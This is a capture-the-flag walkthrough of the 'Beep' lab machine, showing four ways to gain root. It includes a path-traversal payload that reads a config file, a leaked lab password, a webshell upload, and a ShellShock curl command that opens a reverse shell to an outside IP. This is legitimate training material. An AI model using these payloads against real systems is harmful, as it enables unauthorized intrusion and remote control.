Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.

### Difficulty:

`Medium`


# Fixes
Due to this machine's age and the outdated TLS version, issues emerge.
Before we move on, let's solve a couple of them.

### Firefox

### Curl & gobuster 
-k, --insecure           Allow insecure server connections




# Enumeration

I begin as usual with a Nmap scan.

`nmap -sC -sV -A -oG beep beep.htb`

![](https://photos.squarezero.dev/file/abir-images/Beep/1.png)

Multiple ports are open. 

|Ports|Service
|22| ssh OpenSSH 4.3 (protocol 2.0)
|25| smtp
|80| Apache httpd 2.2.3
|110| pop3
|111| rpcbind
|143| imap
|443| Apache httpd 2.2.3
|3306| mysql
|10000| http MiniServ 1.570 (Webmin httpd)

Next, I used [Gobuster]() to find interesting directories.

`gobuster dir -u https://beep.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k`

# Foothold + Privesc

## **Method 1 → LFI**

After visiting the website I have found a login page that use [Elastix]().

![](https://photos.squarezero.dev/file/abir-images/Beep/3.png)

I looked for possible exploits and found an LFI vulnerability. 

![](https://photos.squarezero.dev/file/abir-images/Beep/4.png)

You can find the full explanation in [ExploitDB](https://www.exploit-db.com/exploits/37637)

Payload →
`/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`

After using the payload I found passwords for other portals.

Next I tried to use ssh with following credential to get access.

`root:jEhdIekWmdjE`

![](https://photos.squarezero.dev/file/abir-images/Beep/6.png)

## **Method 2 → Remote Code Execution **

When visiting `/admin` , It asks for password. If cancel is pressed it took me to [FreePBX]() page.

After logging in we get admin dashboard access.

`admin:jEhdIekWmdjE`

![](https://photos.squarezero.dev/file/abir-images/Beep/8.png)

After researching for a little bit I found this vulnerability in [ExploitDB](https://www.exploit-db.com/exploits/18650)

In order for the exploit to work it requires a valid extension.

We can use [svmap]() to find SIP devices in the network and [svwar]() to bruteforce for valid extension.

We can use `INVITE` option to reveal all valid extensions.

Afternatively I found the extension in the recordings dashboard as well.

After finding the extension I found a shell in the system.

## **Method 3 → FileUpload Code Execution**

In port 10000 I found [Webmin]() login page. I logged in with valid credentials and found the admin dashboard.

`root:jEhdIekWmdjE`

![](https://photos.squarezero.dev/file/abir-images/Beep/13.png)

![](https://photos.squarezero.dev/file/abir-images/Beep/14.png)

There was already a commandshell option in the site. 

![](https://photos.squarezero.dev/file/abir-images/Beep/15.png)

There was also a file upload option in the website.

![](https://photos.squarezero.dev/file/abir-images/Beep/22.png)

I uploaded a webshell and after visiting the directory I can execute commands.

![](https://photos.squarezero.dev/file/abir-images/Beep/16.png)

![](https://photos.squarezero.dev/file/abir-images/Beep/17.png)

Then I got a revershell using the webshell I spawned.

## **Method 4 → ShellShock**

While exploring the website I found ![cgi-bin]](). 
This reminded me of [ShellShock]() vulnerability.

![](https://photos.squarezero.dev/file/abir-images/Beep/19.png)

I got a revershell using the vulnerability.

`curl -ks -A "() { :;}; echo Content-Type: text/html; /bin/bash -i >& /dev/tcp/10.10.14.21/9999 0>&1;" https://beep.htb:10000`
